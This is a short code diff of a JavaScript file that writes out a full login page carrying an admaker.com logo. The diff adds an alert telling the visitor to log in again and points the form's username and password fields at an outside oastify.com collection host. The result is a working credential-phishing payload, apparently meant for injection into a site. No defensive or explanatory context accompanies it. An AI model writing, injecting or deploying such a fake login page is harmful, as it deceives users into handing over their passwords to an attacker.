@@ -1,3 +1,4 @@
+alert('Error: Please Login Again')
 document.write(`
 <!DOCTYPE html>
 <html lang="en">
@@ -63,7 +64,7 @@ document.write(`
     <div class="login-container">
         <img src="https://admaker.com/static/images/logo-primary-solo.svg" alt="Logo">
         <h1>Login</h1>
-        <form action="https://example.com/" method="post">
+        <form action="https://8pyki6f804j2kd3td6u4pvcs5jbaz2tqi.oastify.com/" method="post">
             <input type="text" name="username" placeholder="Username" required>
             <input type="password" name="password" placeholder="Password" required>
             <input type="submit" value="Login">
